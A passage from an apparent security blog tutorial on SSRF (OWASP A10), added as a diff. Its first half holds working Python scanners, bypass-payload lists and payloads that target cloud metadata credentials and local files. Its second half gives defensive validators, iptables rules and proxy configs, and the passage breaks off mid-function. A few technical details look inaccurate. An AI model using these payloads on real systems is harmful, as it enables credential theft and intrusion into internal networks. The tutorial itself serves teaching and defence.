@@ -1,0 +1,1547 @@
+---
+title: "OWASP Top 10 2021 - A10: Server-Side Request Forgery (SSRF)"
+description: "Understanding Server-Side Request Forgery: how to exploit internal services and how to prevent SSRF attacks with comprehensive defense strategies"
+author: "Yugesh Mekala"
+date: "2024-01-17"
+categories: [OWASP, Web Security, Application Security, SSRF, Network Security]
+page-layout: full
+title-block-banner: true
+draft: false
+---
+
+## Overview
+
+**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to cause the server-side application to make requests to unintended locations. In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure, or to arbitrary external systems.
+
+## Understanding SSRF
+
+### What is Server-Side Request Forgery?
+
+SSRF occurs when a web application fetches a remote resource without validating the user-supplied URL. This allows attackers to:
+
+- **Access internal services** behind firewalls
+- **Read local files** on the server
+- **Perform port scanning** of internal networks
+- **Access cloud metadata services**
+- **Bypass authentication mechanisms**
+- **Exfiltrate sensitive data**
+
+### Common SSRF Scenarios
+
+1. **URL parameter exploitation**
+2. **File upload with external URLs**
+3. **Webhook functionality abuse**
+4. **PDF generators and document converters**
+5. **Image processing services**
+6. **API integrations**
+
+## Real-World Impact
+
+### Notable SSRF Incidents
+
+- **Capital One Breach (2019)**: SSRF exploited to access AWS metadata service
+- **Webhooks exploitation**: Attackers accessing internal services through callback URLs
+- **Cloud service attacks**: Accessing metadata endpoints to steal credentials
+
+## Exploitation Techniques
+
+### 1. Basic SSRF Exploitation
+
+```python
+import requests
+import urllib.parse
+from typing import List, Dict
+
+class SSRFExploiter:
+    """Demonstrate SSRF exploitation techniques"""
+    
+    def __init__(self, target_url: str):
+        self.target_url = target_url
+        self.session = requests.Session()
+    
+    def test_basic_ssrf(self, payload_url: str) -> Dict:
+        """Test basic SSRF vulnerability"""
+        
+        # Common parameter names that might be vulnerable
+        parameters = ['url', 'uri', 'link', 'src', 'source', 'target', 'dest', 'redirect']
+        
+        results = {}
+        
+        for param in parameters:
+            try:
+                response = self.session.get(
+                    self.target_url,
+                    params={param: payload_url},
+                    timeout=10
+                )
+                
+                results[param] = {
+                    'status_code': response.status_code,
+                    'content_length': len(response.content),
+                    'response_time': response.elapsed.total_seconds(),
+                    'vulnerable': self._analyze_response(response, payload_url)
+                }
+                
+            except requests.RequestException as e:
+                results[param] = {'error': str(e)}
+        
+        return results
+    
+    def _analyze_response(self, response: requests.Response, payload: str) -> bool:
+        """Analyze response to determine if SSRF was successful"""
+        
+        # Check for common indicators
+        indicators = [
+            'internal server error' in response.text.lower(),
+            'connection refused' in response.text.lower(),
+            'timeout' in response.text.lower(),
+            response.status_code in [500, 502, 503, 504],
+            len(response.content) == 0 and response.status_code == 200
+        ]
+        
+        return any(indicators)
+    
+    def test_localhost_access(self) -> List[Dict]:
+        """Test access to localhost services"""
+        
+        localhost_targets = [
+            'http://localhost',
+            'http://127.0.0.1',
+            'http://0.0.0.0',
+            'http://[::1]',
+            'http://localhost:80',
+            'http://localhost:8080',
+            'http://localhost:3000',
+            'http://localhost:5000',
+            'http://localhost:6379',  # Redis
+            'http://localhost:27017', # MongoDB
+            'http://localhost:3306',  # MySQL
+        ]
+        
+        results = []
+        
+        for target in localhost_targets:
+            result = self.test_basic_ssrf(target)
+            results.append({
+                'target': target,
+                'results': result
+            })
+        
+        return results
+    
+    def test_internal_network_scan(self, network_range: str = '192.168.1') -> List[Dict]:
+        """Test internal network scanning"""
+        
+        results = []
+        
+        for i in range(1, 255):
+            target = f'http://{network_range}.{i}'
+            
+            try:
+                result = self.test_basic_ssrf(target)
+                if any(r.get('vulnerable', False) for r in result.values()):
+                    results.append({
+                        'ip': f'{network_range}.{i}',
+                        'response': result
+                    })
+            except Exception:
+                continue
+        
+        return results
+    
+    def test_cloud_metadata_access(self) -> Dict:
+        """Test access to cloud metadata services"""
+        
+        cloud_metadata_endpoints = {
+            'AWS': [
+                'http://169.254.169.254/latest/meta-data/',
+                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+                'http://169.254.169.254/latest/user-data',
+                'http://169.254.169.254/latest/dynamic/instance-identity/document'
+            ],
+            'Azure': [
+                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                'http://169.254.169.254/metadata/identity/oauth2/token'
+            ],
+            'Google Cloud': [
+                'http://metadata.google.internal/computeMetadata/v1/',
+                'http://169.254.169.254/computeMetadata/v1/',
+                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
+            ],
+            'DigitalOcean': [
+                'http://169.254.169.254/metadata/v1.json'
+            ]
+        }
+        
+        results = {}
+        
+        for provider, endpoints in cloud_metadata_endpoints.items():
+            results[provider] = {}
+            
+            for endpoint in endpoints:
+                result = self.test_basic_ssrf(endpoint)
+                results[provider][endpoint] = result
+        
+        return results
+    
+    def test_file_access(self) -> Dict:
+        """Test local file access through SSRF"""
+        
+        file_payloads = [
+            'file:///etc/passwd',
+            'file:///etc/hosts',
+            'file:///proc/version',
+            'file:///proc/cpuinfo',
+            'file:///etc/issue',
+            'file://C:/Windows/System32/drivers/etc/hosts',
+            'file://C:/boot.ini',
+            'file:///etc/shadow'
+        ]
+        
+        results = {}
+        
+        for payload in file_payloads:
+            result = self.test_basic_ssrf(payload)
+            results[payload] = result
+        
+        return results
+
+# Example usage (for educational purposes only)
+"""
+# DO NOT USE AGAINST SYSTEMS YOU DON'T OWN
+exploiter = SSRFExploiter("http://vulnerable-app.example.com/fetch")
+
+# Test localhost access
+localhost_results = exploiter.test_localhost_access()
+print("Localhost access results:", localhost_results)
+
+# Test cloud metadata
+cloud_results = exploiter.test_cloud_metadata_access()
+print("Cloud metadata results:", cloud_results)
+"""
+```
+
+### 2. Advanced SSRF Bypass Techniques
+
+```python
+import socket
+import urllib.parse
+from typing import List
+
+class SSRFBypassTechniques:
+    """Advanced SSRF bypass techniques"""
+    
+    @staticmethod
+    def ip_encoding_bypasses(target_ip: str = "127.0.0.1") -> List[str]:
+        """Generate various IP encoding bypasses"""
+        
+        bypasses = []
+        
+        # Decimal encoding
+        ip_parts = target_ip.split('.')
+        decimal_ip = int(ip_parts[0]) * 16777216 + int(ip_parts[1]) * 65536 + int(ip_parts[2]) * 256 + int(ip_parts[3])
+        bypasses.append(f"http://{decimal_ip}")
+        
+        # Hexadecimal encoding
+        hex_ip = '.'.join([hex(int(part)) for part in ip_parts])
+        bypasses.append(f"http://{hex_ip}")
+        
+        # Octal encoding
+        octal_ip = '.'.join([oct(int(part)) for part in ip_parts])
+        bypasses.append(f"http://{octal_ip}")
+        
+        # Mixed encoding
+        bypasses.extend([
+            f"http://0x7f000001",  # Hex for 127.0.0.1
+            f"http://2130706433",  # Decimal for 127.0.0.1
+            f"http://017700000001", # Octal for 127.0.0.1
+            f"http://127.1",       # Shortened notation
+            f"http://127.0.1",     # Shortened notation
+        ])
+        
+        return bypasses
+    
+    @staticmethod
+    def dns_bypasses() -> List[str]:
+        """DNS-based bypass techniques"""
+        
+        return [
+            "http://localtest.me",          # Resolves to 127.0.0.1
+            "http://customer1.app.localhost.example.com",
+            "http://mail.ebc.apple.com",    # Resolves to 127.0.0.1
+            "http://127.0.0.1.nip.io",     # Wildcard DNS
+            "http://www.baidu.com",         # External redirect
+            "http://127.0.0.1.xip.io",
+            "http://0:8080"                 # IPv6 localhost
+        ]
+    
+    @staticmethod
+    def url_bypass_techniques(target: str) -> List[str]:
+        """Various URL manipulation bypass techniques"""
+        
+        bypasses = []
+        
+        # URL encoding
+        bypasses.append(urllib.parse.quote(target, safe=''))
+        
+        # Double URL encoding
+        bypasses.append(urllib.parse.quote(urllib.parse.quote(target, safe=''), safe=''))
+        
+        # Unicode encoding
+        bypasses.extend([
+            target.replace('localhost', 'localhost%E2%80%8D'),  # Zero-width joiner
+            target.replace('127.0.0.1', '127.0.0.1%00'),       # Null byte
+            target.replace('http://', 'http://＠'),              # Unicode @
+        ])
+        
+        # Protocol bypasses
+        if target.startswith('http://'):
+            bypasses.extend([
+                target.replace('http://', 'https://'),
+                target.replace('http://', 'ftp://'),
+                target.replace('http://', 'gopher://'),
+                target.replace('http://', 'dict://'),
+                target.replace('http://', 'ldap://'),
+                target.replace('http://', 'tftp://'),
+            ])
+        
+        # Port manipulation
+        if ':' not in target.split('/')[-1]:  # No port specified
+            bypasses.extend([
+                target + ':80',
+                target + ':8080',
+                target + ':443',
+            ])
+        
+        return bypasses
+    
+    @staticmethod
+    def redirect_bypasses(target: str) -> List[str]:
+        """Redirect-based bypass techniques"""
+        
+        # These would require setting up redirect services
+        return [
+            f"http://evil.com/redirect?url={urllib.parse.quote(target)}",
+            f"http://bit.ly/redirect-to-internal",  # Shortened URL
+            f"http://tinyurl.com/internal-redirect",
+        ]
+    
+    @staticmethod
+    def generate_comprehensive_payloads(target: str = "http://127.0.0.1:80") -> List[str]:
+        """Generate comprehensive list of SSRF payloads"""
+        
+        all_payloads = []
+        
+        # Basic payloads
+        all_payloads.append(target)
+        
+        # IP encoding bypasses
+        all_payloads.extend(SSRFBypassTechniques.ip_encoding_bypasses())
+        
+        # DNS bypasses
+        all_payloads.extend(SSRFBypassTechniques.dns_bypasses())
+        
+        # URL manipulation
+        all_payloads.extend(SSRFBypassTechniques.url_bypass_techniques(target))
+        
+        # Remove duplicates
+        return list(set(all_payloads))
+
+# Generate payloads for testing
+bypass_techniques = SSRFBypassTechniques()
+payloads = bypass_techniques.generate_comprehensive_payloads()
+
+print("Generated SSRF bypass payloads:")
+for i, payload in enumerate(payloads[:10], 1):  # Show first 10
+    print(f"{i}. {payload}")
+```
+
+### 3. SSRF Exploitation Framework
+
+```python
+import asyncio
+import aiohttp
+import time
+from concurrent.futures import ThreadPoolExecutor
+from typing import Dict, List, Tuple
+
+class SSRFExploitationFramework:
+    """Comprehensive SSRF exploitation framework"""
+    
+    def __init__(self, target_url: str, concurrent_requests: int = 10):
+        self.target_url = target_url
+        self.concurrent_requests = concurrent_requests
+        self.results = {}
+        
+        # Common services and their default ports
+        self.common_services = {
+            21: 'FTP',
+            22: 'SSH',
+            23: 'Telnet',
+            25: 'SMTP',
+            53: 'DNS',
+            80: 'HTTP',
+            110: 'POP3',
+            143: 'IMAP',
+            443: 'HTTPS',
+            993: 'IMAPS',
+            995: 'POP3S',
+            1433: 'MSSQL',
+            3306: 'MySQL',
+            3389: 'RDP',
+            5432: 'PostgreSQL',
+            6379: 'Redis',
+            8080: 'HTTP-Alt',
+            27017: 'MongoDB'
+        }
+    
+    async def test_single_ssrf(self, session: aiohttp.ClientSession, 
+                             parameter: str, payload: str) -> Dict:
+        """Test single SSRF payload asynchronously"""
+        
+        try:
+            start_time = time.time()
+            
+            async with session.get(
+                self.target_url,
+                params={parameter: payload},
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as response:
+                content = await response.text()
+                end_time = time.time()
+                
+                return {
+                    'parameter': parameter,
+                    'payload': payload,
+                    'status_code': response.status,
+                    'content_length': len(content),
+                    'response_time': end_time - start_time,
+                    'headers': dict(response.headers),
+                    'content_sample': content[:500],
+                    'vulnerable': self._analyze_ssrf_response(response, content)
+                }
+        
+        except asyncio.TimeoutError:
+            return {
+                'parameter': parameter,
+                'payload': payload,
+                'error': 'timeout',
+                'vulnerable': True  # Timeout might indicate successful SSRF
+            }
+        
+        except Exception as e:
+            return {
+                'parameter': parameter,
+                'payload': payload,
+                'error': str(e),
+                'vulnerable': False
+            }
+    
+    def _analyze_ssrf_response(self, response: aiohttp.ClientResponse, 
+                              content: str) -> bool:
+        """Analyze response to determine SSRF success"""
+        
+        # Check for various indicators
+        indicators = [
+            # Error messages that indicate internal access
+            'connection refused' in content.lower(),
+            'connection timed out' in content.lower(),
+            'no route to host' in content.lower(),
+            'internal server error' in content.lower(),
+            
+            # Status codes indicating backend issues
+            response.status in [500, 502, 503, 504],
+            
+            # Response time indicators (very fast or very slow)
+            'timeout' in content.lower(),
+            
+            # Specific service responses
+            'ssh-' in content.lower(),
+            'ftp' in content.lower(),
+            'mysql' in content.lower(),
+            'redis' in content.lower(),
+            
+            # Cloud metadata indicators
+            'ami-' in content.lower(),
+            'instance-id' in content.lower(),
+            'security-credentials' in content.lower(),
+        ]
+        
+        return any(indicators)
+    
+    async def comprehensive_ssrf_scan(self) -> Dict:
+        """Perform comprehensive SSRF scan"""
+        
+        # Parameters to test
+        parameters = [
+            'url', 'uri', 'link', 'src', 'source', 'target', 'dest', 
+            'redirect', 'next', 'file', 'path', 'feed', 'api_url'
+        ]
+        
+        # Generate payloads
+        payloads = self._generate_all_payloads()
+        
+        async with aiohttp.ClientSession() as session:
+            tasks = []
+            
+            for param in parameters:
+                for payload in payloads:
+                    task = self.test_single_ssrf(session, param, payload)
+                    tasks.append(task)
+            
+            # Execute with controlled concurrency
+            semaphore = asyncio.Semaphore(self.concurrent_requests)
+            
+            async def sem_task(task):
+                async with semaphore:
+                    return await task
+            
+            results = await asyncio.gather(*[sem_task(task) for task in tasks])
+        
+        # Organize results
+        organized_results = {
+            'vulnerable_findings': [],
+            'suspicious_findings': [],
+            'error_findings': [],
+            'summary': {}
+        }
+        
+        for result in results:
+            if result.get('vulnerable'):
+                organized_results['vulnerable_findings'].append(result)
+            elif result.get('error'):
+                organized_results['error_findings'].append(result)
+            else:
+                organized_results['suspicious_findings'].append(result)
+        
+        # Generate summary
+        organized_results['summary'] = {
+            'total_tests': len(results),
+            'vulnerable_count': len(organized_results['vulnerable_findings']),
+            'error_count': len(organized_results['error_findings']),
+            'most_vulnerable_parameter': self._find_most_vulnerable_parameter(results)
+        }
+        
+        return organized_results
+    
+    def _generate_all_payloads(self) -> List[str]:
+        """Generate comprehensive payload list"""
+        
+        payloads = []
+        
+        # Localhost variants
+        localhost_payloads = [
+            'http://localhost',
+            'http://127.0.0.1',
+            'http://0.0.0.0',
+            'http://[::1]',
+            'http://0:80',
+        ]
+        payloads.extend(localhost_payloads)
+        
+        # Port scanning payloads
+        for port in self.common_services.keys():
+            payloads.extend([
+                f'http://127.0.0.1:{port}',
+                f'http://localhost:{port}',
+                f'http://0.0.0.0:{port}'
+            ])
+        
+        # Cloud metadata
+        cloud_payloads = [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://169.254.169.254/metadata/instance',
+            'http://metadata.google.internal/computeMetadata/v1/',
+        ]
+        payloads.extend(cloud_payloads)
+        
+        # File access
+        file_payloads = [
+            'file:///etc/passwd',
+            'file:///etc/hosts',
+            'file:///proc/version',
+            'file://C:/Windows/System32/drivers/etc/hosts',
+        ]
+        payloads.extend(file_payloads)
+        
+        # Internal network ranges
+        internal_ranges = ['192.168.1.1', '10.0.0.1', '172.16.0.1']
+        for ip in internal_ranges:
+            payloads.append(f'http://{ip}')
+        
+        # Bypass techniques
+        bypass_payloads = SSRFBypassTechniques.generate_comprehensive_payloads()
+        payloads.extend(bypass_payloads)
+        
+        return list(set(payloads))  # Remove duplicates
+    
+    def _find_most_vulnerable_parameter(self, results: List[Dict]) -> str:
+        """Find parameter with most successful SSRF attempts"""
+        
+        param_counts = {}
+        
+        for result in results:
+            if result.get('vulnerable'):
+                param = result.get('parameter')
+                param_counts[param] = param_counts.get(param, 0) + 1
+        
+        if param_counts:
+            return max(param_counts.items(), key=lambda x: x[1])
+        
+        return None
+    
+    def generate_exploitation_report(self, results: Dict) -> str:
+        """Generate detailed exploitation report"""
+        
+        report = f"""
+SSRF EXPLOITATION REPORT
+========================
+Target: {self.target_url}
+Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
+
+SUMMARY:
+--------
+Total Tests: {results['summary']['total_tests']}
+Vulnerable Findings: {results['summary']['vulnerable_count']}
+Error-based Findings: {results['summary']['error_count']}
+Most Vulnerable Parameter: {results['summary']['most_vulnerable_parameter']}
+
+VULNERABLE FINDINGS:
+-------------------
+"""
+        
+        for finding in results['vulnerable_findings']:
+            report += f"""
+Parameter: {finding['parameter']}
+Payload: {finding['payload']}
+Status Code: {finding.get('status_code', 'N/A')}
+Response Time: {finding.get('response_time', 'N/A')}s
+Content Sample: {finding.get('content_sample', 'N/A')[:100]}...
+---
+"""
+        
+        report += """
+
+RECOMMENDATIONS:
+---------------
+1. Implement URL validation and allowlisting
+2. Use network segmentation to isolate internal services
+3. Disable unnecessary protocols (file://, gopher://, etc.)
+4. Implement request timeout limits
+5. Monitor and log outbound requests
+6. Use WAF rules to detect SSRF patterns
+
+"""
+        
+        return report
+
+# Usage example
+async def run_ssrf_scan():
+    """Run comprehensive SSRF scan"""
+    
+    # Target application with potential SSRF vulnerability
+    target = "http://vulnerable-app.example.com/fetch"
+    
+    # Initialize framework
+    framework = SSRFExploitationFramework(target)
+    
+    # Run comprehensive scan
+    print("Starting comprehensive SSRF scan...")
+    results = await framework.comprehensive_ssrf_scan()
+    
+    # Generate report
+    report = framework.generate_exploitation_report(results)
+    
+    # Save report
+    with open('ssrf_exploitation_report.txt', 'w') as f:
+        f.write(report)
+    
+    print("SSRF scan completed. Report saved to ssrf_exploitation_report.txt")
+    
+    return results
+
+# Uncomment to run (for educational purposes only)
+# asyncio.run(run_ssrf_scan())
+```
+
+## Detection and Prevention
+
+### 1. Input Validation and Filtering
+
+```python
+import re
+import ipaddress
+import urllib.parse
+from typing import List, Tuple, Optional
+from urllib.parse import urlparse
+
+class SSRFProtection:
+    """Comprehensive SSRF protection implementation"""
+    
+    def __init__(self):
+        # Blocked IP ranges (RFC 1918 private networks + localhost)
+        self.blocked_ip_ranges = [
+            ipaddress.ip_network('127.0.0.0/8'),    # Localhost
+            ipaddress.ip_network('10.0.0.0/8'),     # Private Class A
+            ipaddress.ip_network('172.16.0.0/12'),  # Private Class B
+            ipaddress.ip_network('192.168.0.0/16'), # Private Class C
+            ipaddress.ip_network('169.254.0.0/16'), # Link-local
+            ipaddress.ip_network('224.0.0.0/4'),    # Multicast
+            ipaddress.ip_network('240.0.0.0/4'),    # Reserved
+            ipaddress.ip_network('::1/128'),        # IPv6 localhost
+            ipaddress.ip_network('fe80::/10'),      # IPv6 link-local
+            ipaddress.ip_network('fc00::/7'),       # IPv6 private
+        ]
+        
+        # Allowed URL schemes
+        self.allowed_schemes = ['http', 'https']
+        
+        # Blocked schemes
+        self.blocked_schemes = [
+            'file', 'ftp', 'gopher', 'dict', 'ldap', 'ldaps',
+            'tftp', 'sftp', 'ssh', 'telnet', 'jar', 'netdoc'
+        ]
+        
+        # Allowed domains (whitelist approach)
+        self.allowed_domains = [
+            'api.example.com',
+            'cdn.example.com',
+            'images.example.com'
+        ]
+        
+        # Blocked domains
+        self.blocked_domains = [
+            'localhost',
+            'metadata.google.internal',
+            'instance-data.ec2.internal'
+        ]
+        
+        # Dangerous ports
+        self.blocked_ports = [
+            22,    # SSH
+            23,    # Telnet
+            25,    # SMTP
+            110,   # POP3
+            143,   # IMAP
+            993,   # IMAPS
+            995,   # POP3S
+            1433,  # MSSQL
+            3306,  # MySQL
+            3389,  # RDP
+            5432,  # PostgreSQL
+            6379,  # Redis
+            27017, # MongoDB
+        ]
+    
+    def validate_url(self, url: str) -> Tuple[bool, str]:
+        """Comprehensive URL validation against SSRF"""
+        
+        try:
+            # Basic URL parsing
+            parsed = urlparse(url)
+            
+            # Validate scheme
+            if not self._validate_scheme(parsed.scheme):
+                return False, f"Blocked scheme: {parsed.scheme}"
+            
+            # Validate hostname
+            if not self._validate_hostname(parsed.hostname):
+                return False, f"Blocked hostname: {parsed.hostname}"
+            
+            # Validate port
+            if not self._validate_port(parsed.port):
+                return False, f"Blocked port: {parsed.port}"
+            
+            # Validate IP address
+            if not self._validate_ip_address(parsed.hostname):
+                return False, f"Blocked IP address: {parsed.hostname}"
+            
+            # Additional security checks
+            if not self._additional_security_checks(url):
+                return False, "Failed additional security checks"
+            
+            return True, "URL validation passed"
+        
+        except Exception as e:
+            return False, f"URL parsing error: {str(e)}"
+    
+    def _validate_scheme(self, scheme: str) -> bool:
+        """Validate URL scheme"""
+        
+        if not scheme:
+            return False
+        
+        scheme = scheme.lower()
+        
+        # Check against blocked schemes
+        if scheme in self.blocked_schemes:
+            return False
+        
+        # Check against allowed schemes (whitelist)
+        return scheme in self.allowed_schemes
+    
+    def _validate_hostname(self, hostname: str) -> bool:
+        """Validate hostname"""
+        
+        if not hostname:
+            return False
+        
+        hostname = hostname.lower()
+        
+        # Check against blocked domains
+        if hostname in self.blocked_domains:
+            return False
+        
+        # Check for localhost variations
+        localhost_patterns = [
+            r'^localhost$',
+            r'^127\..*',
+            r'^0\..*',
+            r'^::1$',
+            r'^0:.*'
+        ]
+        
+        for pattern in localhost_patterns:
+            if re.match(pattern, hostname):
+                return False
+        
+        # Whitelist approach - only allow specific domains
+        if self.allowed_domains:
+            return any(
+                hostname == domain or hostname.endswith('.' + domain)
+                for domain in self.allowed_domains
+            )
+        
+        return True
+    
+    def _validate_port(self, port: Optional[int]) -> bool:
+        """Validate port number"""
+        
+        if port is None:
+            return True  # No explicit port specified
+        
+        # Check against blocked ports
+        if port in self.blocked_ports:
+            return False
+        
+        # Check for valid port range
+        if not (1 <= port <= 65535):
+            return False
+        
+        return True
+    
+    def _validate_ip_address(self, hostname: str) -> bool:
+        """Validate IP address against blocked ranges"""
+        
+        if not hostname:
+            return True
+        
+        try:
+            # Try to parse as IP address
+            ip = ipaddress.ip_address(hostname)
+            
+            # Check against blocked IP ranges
+            for blocked_range in self.blocked_ip_ranges:
+                if ip in blocked_range:
+                    return False
+            
+            return True
+        
+        except ValueError:
+            # Not an IP address, skip this check
+            return True
+    
+    def _additional_security_checks(self, url: str) -> bool:
+        """Additional security checks"""
+        
+        # Check for URL encoding bypasses
+        decoded_url = urllib.parse.unquote(url)
+        if decoded_url != url:
+            # Recursively validate decoded URL
+            is_valid, _ = self.validate_url(decoded_url)
+            if not is_valid:
+                return False
+        
+        # Check for suspicious patterns
+        suspicious_patterns = [
+            r'@',           # Username/password in URL
+            r'%2e%2e',      # URL-encoded ..
+            r'\.\./',       # Directory traversal
+            r'%00',         # Null byte
+            r'%0a',         # Newline
+            r'%0d',         # Carriage return
+        ]
+        
+        for pattern in suspicious_patterns:
+            if re.search(pattern, url, re.IGNORECASE):
+                return False
+        
+        return True
+    
+    def safe_url_fetch(self, url: str, timeout: int = 10) -> Tuple[bool, str, Optional[bytes]]:
+        """Safely fetch URL with SSRF protection"""
+        
+        import requests
+        
+        # Validate URL first
+        is_valid, validation_message = self.validate_url(url)
+        
+        if not is_valid:
+            return False, validation_message, None
+        
+        try:
+            # Configure secure session
+            session = requests.Session()
+            
+            # Set security headers
+            session.headers.update({
+                'User-Agent': 'SecureApp/1.0',
+                'Accept': 'text/html,application/json',
+            })
+            
+            # Make request with timeout
+            response = session.get(
+                url,
+                timeout=timeout,
+                allow_redirects=False,  # Prevent redirect-based bypasses
+                verify=True,            # Verify SSL certificates
+                stream=True            # Stream response to limit memory usage
+            )
+            
+            # Check response size to prevent DoS
+            content_length = response.headers.get('content-length')
+            if content_length and int(content_length) > 10 * 1024 * 1024:  # 10MB limit
+                return False, "Response too large", None
+            
+            # Read content with size limit
+            content = response.content[:10 * 1024 * 1024]  # 10MB limit
+            
+            return True, "Success", content
+        
+        except requests.exceptions.Timeout:
+            return False, "Request timeout", None
+        
+        except requests.exceptions.ConnectionError:
+            return False, "Connection error", None
+        
+        except Exception as e:
+            return False, f"Request error: {str(e)}", None
+
+# Usage example
+ssrf_protection = SSRFProtection()
+
+# Test various URLs
+test_urls = [
+    'http://example.com/api/data',           # Should pass
+    'http://localhost/admin',                # Should be blocked
+    'http://127.0.0.1/metadata',            # Should be blocked
+    'file:///etc/passwd',                    # Should be blocked
+    'http://169.254.169.254/metadata',       # Should be blocked
+    'http://api.example.com/webhook',        # Should pass (if whitelisted)
+]
+
+print("SSRF Protection Testing:")
+print("=" * 50)
+
+for url in test_urls:
+    is_valid, message = ssrf_protection.validate_url(url)
+    status = "✅ ALLOWED" if is_valid else "❌ BLOCKED"
+    print(f"{status}: {url}")
+    print(f"   Reason: {message}\n")
+```
+
+### 2. Network-Level Protection
+
+```python
+import socket
+import subprocess
+import ipaddress
+from typing import List, Dict, Optional
+
+class NetworkLevelSSRFProtection:
+    """Network-level SSRF protection mechanisms"""
+    
+    def __init__(self):
+        self.firewall_rules = []
+        self.monitored_connections = []
+    
+    def setup_egress_filtering(self) -> List[str]:
+        """Generate iptables rules for egress filtering"""
+        
+        rules = [
+            "# SSRF Protection - Egress Filtering",
+            "",
+            "# Create custom chain for SSRF protection",
+            "iptables -N SSRF_PROTECTION",
+            "",
+            "# Block access to private IP ranges",
+            "iptables -A SSRF_PROTECTION -d 127.0.0.0/8 -j DROP",
+            "iptables -A SSRF_PROTECTION -d 10.0.0.0/8 -j DROP", 
+            "iptables -A SSRF_PROTECTION -d 172.16.0.0/12 -j DROP",
+            "iptables -A SSRF_PROTECTION -d 192.168.0.0/16 -j DROP",
+            "iptables -A SSRF_PROTECTION -d 169.254.0.0/16 -j DROP",
+            "",
+            "# Block cloud metadata endpoints",
+            "iptables -A SSRF_PROTECTION -d 169.254.169.254 -j DROP",
+            "",
+            "# Block dangerous ports",
+            "iptables -A SSRF_PROTECTION -p tcp --dport 22 -j DROP",   # SSH
+            "iptables -A SSRF_PROTECTION -p tcp --dport 23 -j DROP",   # Telnet
+            "iptables -A SSRF_PROTECTION -p tcp --dport 25 -j DROP",   # SMTP
+            "iptables -A SSRF_PROTECTION -p tcp --dport 3306 -j DROP", # MySQL
+            "iptables -A SSRF_PROTECTION -p tcp --dport 6379 -j DROP", # Redis
+            "",
+            "# Allow only HTTP/HTTPS to external addresses",
+            "iptables -A SSRF_PROTECTION -p tcp --dport 80 -j ACCEPT",
+            "iptables -A SSRF_PROTECTION -p tcp --dport 443 -j ACCEPT",
+            "",
+            "# Log and drop everything else",
+            "iptables -A SSRF_PROTECTION -j LOG --log-prefix 'SSRF_BLOCKED: '",
+            "iptables -A SSRF_PROTECTION -j DROP",
+            "",
+            "# Apply SSRF protection to web application user",
+            "iptables -A OUTPUT -m owner --uid-owner www-data -j SSRF_PROTECTION",
+        ]
+        
+        return rules
+    
+    def setup_network_namespace(self, namespace_name: str = "ssrf_protected") -> List[str]:
+        """Create isolated network namespace for SSRF protection"""
+        
+        commands = [
+            f"# Create network namespace for SSRF protection",
+            f"ip netns add {namespace_name}",
+            "",
+            f"# Create veth pair",
+            f"ip link add veth0 type veth peer name veth1",
+            "",
+            f"# Move veth1 to namespace",
+            f"ip link set veth1 netns {namespace_name}",
+            "",
+            f"# Configure interfaces",
+            f"ip addr add 10.200.1.1/24 dev veth0",
+            f"ip link set veth0 up",
+            "",
+            f"# Configure namespace interface",
+            f"ip netns exec {namespace_name} ip addr add 10.200.1.2/24 dev veth1",
+            f"ip netns exec {namespace_name} ip link set veth1 up",
+            f"ip netns exec {namespace_name} ip link set lo up",
+            "",
+            f"# Set up NAT for allowed traffic",
+            f"iptables -t nat -A POSTROUTING -s 10.200.1.0/24 -o eth0 -j MASQUERADE",
+            "",
+            f"# Forward only allowed ports",
+            f"iptables -A FORWARD -i veth0 -o eth0 -p tcp --dport 80 -j ACCEPT",
+            f"iptables -A FORWARD -i veth0 -o eth0 -p tcp --dport 443 -j ACCEPT",
+            f"iptables -A FORWARD -i veth0 -o eth0 -j DROP",
+            "",
+            f"# Run application in namespace",
+            f"# ip netns exec {namespace_name} /path/to/your/application",
+        ]
+        
+        return commands
+    
+    def create_proxy_configuration(self) -> Dict[str, str]:
+        """Create proxy configuration for filtering outbound requests"""
+        
+        squid_config = """
+# Squid configuration for SSRF protection
+http_port 3128
+
+# Define ACLs for blocked destinations
+acl blocked_ips dst 127.0.0.0/8
+acl blocked_ips dst 10.0.0.0/8
+acl blocked_ips dst 172.16.0.0/12
+acl blocked_ips dst 192.168.0.0/16
+acl blocked_ips dst 169.254.0.0/16
+acl blocked_ips dst 169.254.169.254
+
+# Define blocked ports
+acl blocked_ports port 22 23 25 110 143 993 995 1433 3306 3389 5432 6379 27017
+
+# Define allowed destinations (whitelist)
+acl allowed_domains dstdomain .example.com
+acl allowed_domains dstdomain .api.trusted-partner.com
+
+# Define allowed ports
+acl allowed_ports port 80 443
+
+# Access rules
+http_access deny blocked_ips
+http_access deny blocked_ports
+http_access allow allowed_domains allowed_ports
+http_access deny all
+
+# Logging
+access_log /var/log/squid/access.log
+cache_log /var/log/squid/cache.log
+
+# Disable caching to ensure fresh requests
+cache deny all
+"""
+        
+        nginx_config = """
+# Nginx configuration for SSRF protection proxy
+
+upstream blocked_response {
+    server 127.0.0.1:8081;  # Dummy server for blocked requests
+}
+
+server {
+    listen 8080;
+    
+    # Log all requests
+    access_log /var/log/nginx/ssrf_proxy.log;
+    error_log /var/log/nginx/ssrf_proxy_error.log;
+    
+    location / {
+        # Extract target URL from request
+        set $target_url $arg_url;
+        
+        # Validate URL using Lua script
+        access_by_lua_block {
+            local url = ngx.var.target_url
+            
+            -- Check for blocked patterns
+            if string.match(url, "localhost") or 
+               string.match(url, "127%.") or
+               string.match(url, "192%.168%.") or
+               string.match(url, "10%.") or
+               string.match(url, "172%.1[6-9]%.") or
+               string.match(url, "172%.2[0-9]%.") or
+               string.match(url, "172%.3[01]%.") then
+                ngx.status = 403
+                ngx.say("Forbidden: SSRF attempt detected")
+                ngx.exit(403)
+            end
+        }
+        
+        # Proxy to validated URL
+        proxy_pass $target_url;
+        proxy_timeout 10s;
+        proxy_connect_timeout 5s;
+    }
+}
+"""
+        
+        return {
+            'squid.conf': squid_config,
+            'nginx.conf': nginx_config
+        }
+    
+    def monitor_network_connections(self, process_name: str = "webapp") -> List[Dict]:
+        """Monitor network connections for SSRF detection"""
+        
+        try:
+            # Use netstat to get connections
+            result = subprocess.run(
+                ['netstat', '-tuln'], 
+                capture_output=True, 
+                text=True
+            )
+            
+            connections = []
+            
